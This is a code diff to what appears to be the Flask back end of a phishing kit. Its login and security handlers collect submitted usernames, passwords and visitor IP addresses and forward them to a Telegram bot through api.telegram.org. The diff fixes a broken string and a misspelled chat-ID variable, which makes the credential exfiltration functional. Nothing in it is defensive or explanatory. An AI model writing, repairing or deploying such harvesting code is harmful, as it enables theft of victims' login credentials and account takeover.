@@ -65,7 +65,7 @@ def submit_login():
         return jsonify({"error": "Missing username or password"}), 400
 
     # Format message for Telegram with <code> tags for click-to-copy
-    message = f"🔐 Login2 Page Submission\n<code>Login Id: {username}\nPassword: {password}\nuser Ip: {user_ip}</code>
+    message = f"🔐 Login2 Page Submission\n<code>Login Id: {username}\nPassword: {password}\nuser Ip: {user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -180,7 +180,7 @@ def submit_security():
         response = requests.post(
             telegram_url,
             json={
-                "chat_id": TELEGRAM_CHaAT_ID,
+                "chat_id": TELEGRAM_CHAT_ID,
                 "text": message,
                 "parse_mode": "HTML"
             },
@@ -269,4 +269,3 @@ def submit_images():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
-
